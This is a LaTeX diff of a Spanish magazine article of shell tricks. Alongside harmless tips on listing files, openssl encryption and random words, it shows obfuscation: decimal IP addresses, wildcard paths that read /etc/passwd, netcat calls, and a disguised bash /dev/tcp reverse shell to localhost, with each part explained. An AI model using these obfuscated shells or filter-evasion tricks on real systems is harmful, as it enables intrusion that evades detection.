@@ -1,0 +1,175 @@
+\rput(2.5,-1.0){\resizebox{!}{4.5cm}{{\epsfbox{images/general/trucos1.eps}}}}
+\hypertarget{trucos1}{}\label{trucos}
+
+\pagestyle{trucos}
+
+
+% -------------------------------------------------
+% Cabecera
+\begin{flushright}
+
+
+{\color{introcolor}\mtitle{8cm}{Con un par... de líneas}}
+
+\msubtitle{8cm}{Sácale todo el partido a la línea de comandos}
+
+{\sf\color{white}{ por Tamaríz el de la Perdíz}}
+
+%{{\psset{linecolor=black,linestyle=dotted}\psline(-12,0)}}
+\end{flushright}
+
+
+%\vspace{1mm}
+% -------------------------------------------------
+
+
+%\lstset{language=C,frame=tb,framesep=5pt,basicstyle=\footnotesize}
+\lstset{language=C,frame=tb,framesep=5pt,basicstyle=\scriptsize}
+
+
+
+\begin{multicols}{2}
+
+\hypertarget{como-listar-un-directorio-sin-ls}{%
+\sectiontext{white}{black}{COMO LISTAR UN DIRECTORIO SIN \texttt{ls}}\label{como-listar-un-directorio-sin-ls}}
+
+Este es un truco bastante güay que nos permite listar el contenido de un
+directorio sin usar {\verb!ls!}.
+
+\begin{lstlisting}
+$ for i in *; echo $i; done
+\end{lstlisting}
+
+Alternativamente podemos usar {\verb!echo!} para listar
+los ficheros en un determinado directorio:
+
+\begin{lstlisting}
+$ echo /tmp/*
+\end{lstlisting}
+
+\hypertarget{encriptar-ficheros-tar-con-openssl}{%
+\sectiontext{white}{black}{ENCRIPTAR FICHEROS TAR CON \texttt{openssl}}\label{encriptar-ficheros-tar-con-openssl}}
+
+Alguna vez has tenido que enviar una serie de ficheros protegidos con
+contraseña. Algunas aplicaciones de compresión te permiten cifrar los
+datos, pero en caso de que no tengas ninguna a mano, este es un truco
+para enviar tus datos cifrados
+
+\begin{lstlisting}
+$ tar czf - * | openssl enc -e -aes256 -out sec.tar.gz
+$ openssl enc -d -aes256 -in sec.tar.gz | tar xz -C DIR
+\end{lstlisting}
+
+\hypertarget{ofuscando-ips}{%
+\sectiontext{white}{black}{ODUSCANDO IPs}\label{ofuscando-ips}}
+
+Como todos sabemos una dirección IP es un grupo de 4 valores separados
+por un punto. Cada uno de las partes de una IP puede tomar valores entre
+0 y 255, o en otras palabras, se puede almacenar en un solo byte, y por
+lo tanto, la dirección completa se puede almacenar en un entero de
+32-bits.
+
+Pues bien, muchos programas que aceptan direcciones IP nos permiten
+especificarla como un valor entero. Los siguientes comandos conectan a
+{\verb!localhost!} en el puerto 9999
+
+\begin{lstlisting}
+$ curl 2130706433:9999 
+$ nc $((0x7f000001)) 9999
+\end{lstlisting}
+
+Efectivamente:
+
+\begin{lstlisting}
+ $ printf %x 2130706433
+ $ echo $((0x7f000001))
+ 2130706433
+ $ printf "%x %x %x %x\n" 127 0 0 1
+ 7f 0 0 1
+\end{lstlisting}
+
+Mola no?
+
+\hypertarget{ejecutando-comandos-incompletos}{%
+\sectiontext{white}{black}{EJECUTANDO COMANDOS INCOMPLETOS}\label{ejecutando-comandos-incompletos}}
+
+Sabías que la shell no solo usa los wildcards o caracter comodín para
+expandir parámetros, sino que lo aplica a todos los elementos de la
+línea de comandos?. Por ejemplo, el siguiente comando muestra el fichero
+{\verb!/etc/passwd!}.
+
+\begin{lstlisting}
+$ /???/?at /e??/pa????
+\end{lstlisting}
+
+Otro ejemplo más interesante, usando nuestro querido Netkitty
+(suponiendo que esté instalado en
+{\verb!/usr/local/bin!}
+
+\begin{lstlisting}
+$ /???/l*/???/?k  -c T,2130706433,1337
+\end{lstlisting}
+
+Un par de ejemplos más usando {\verb!nc.openbsd!}
+instalado en {\verb!/bin!}.
+
+\begin{lstlisting}
+$ /???/n?.*s? 2130706433 $((023417))
+$ /???/??.o* 2130706433 $((0x270f))
+$ /???/??.?p* 0177000000001 $((6#114143))
+\end{lstlisting}
+
+Esta línea inicia una conexión al puerto 9999 en localhost. Y esta
+inicia un \emph{reverse shell} a
+{\verb!127.0.0.1:9999!}
+
+\begin{lstlisting}
+$ /???/b??h -i >& `echo /d*/``echo top | \
+> sed s/o/c/`/2130706433/$((6#114143)) 0>&1
+$ /*/b?s? -i >& `echo /d*/``echo top | \
+>sed s/o/c/`/2130706433/9999 0>&1
+\end{lstlisting}
+
+Veamos elemento a elemento que es lo que estamos ejecutando:
+
+\begin{itemize}
+
+\item
+  {\verb!/*/b?s? -i >\&!} esta parte se expandirá a
+  {\verb!/bin/bash -i >\&!} que inicia una shell en
+  modo interactivo y redirecciona la entrada y salida estándar a lo que
+  sigue
+\item
+  {\verb!`echo /d*/``echo top | sed s/o/c/`!} este
+  comando se expande a {\verb!/dev/tcp!} que es un
+  pseudo fichero con el que podemos establecer conexiones TCP desde bash
+\item
+  {\verb!/2130706433/!} esta es la dirección IP en
+  formato decimal. Ya has visto como generarla en el truco anterior. En
+  este caso corresponde con {\verb!127.0.0.1!}
+\item
+  {\verb!$((6\#114143))!} este es el puerto 9999 en
+  base 6
+\item
+  {\verb!0>\&1!} y esta redirección final indica que la
+  entrada estándar también se redirige al descriptor de ficheros 1 que
+  ahora es el socket TCP a la dirección indicada.
+\end{itemize}
+
+\hypertarget{generar-palabras-aleatorias}{%
+\sectiontext{white}{black}{GENERAR PALABRAS ALEATORIAS}\label{generar-palabras-aleatorias}}
+
+La utilidad {\verb!look!} genera una lista de palabras
+que empiezan por los caracteres que le pasamos como parámetro. En
+realidad lo que hace es una búsqueda en el diccionario del sistema
+buscando palabras que comiencen con las letras que le indicamos. Podemos
+usar esta utilidad para generar una palabra aleatorio con un comando
+como este:
+
+\begin{lstlisting}
+$ look . | shuf | head -1
+\end{lstlisting}
+
+Si cambiamos el {\verb!-1!} de
+{\verb!head!} podemos obtener más palabras :)
+\end{multicols}
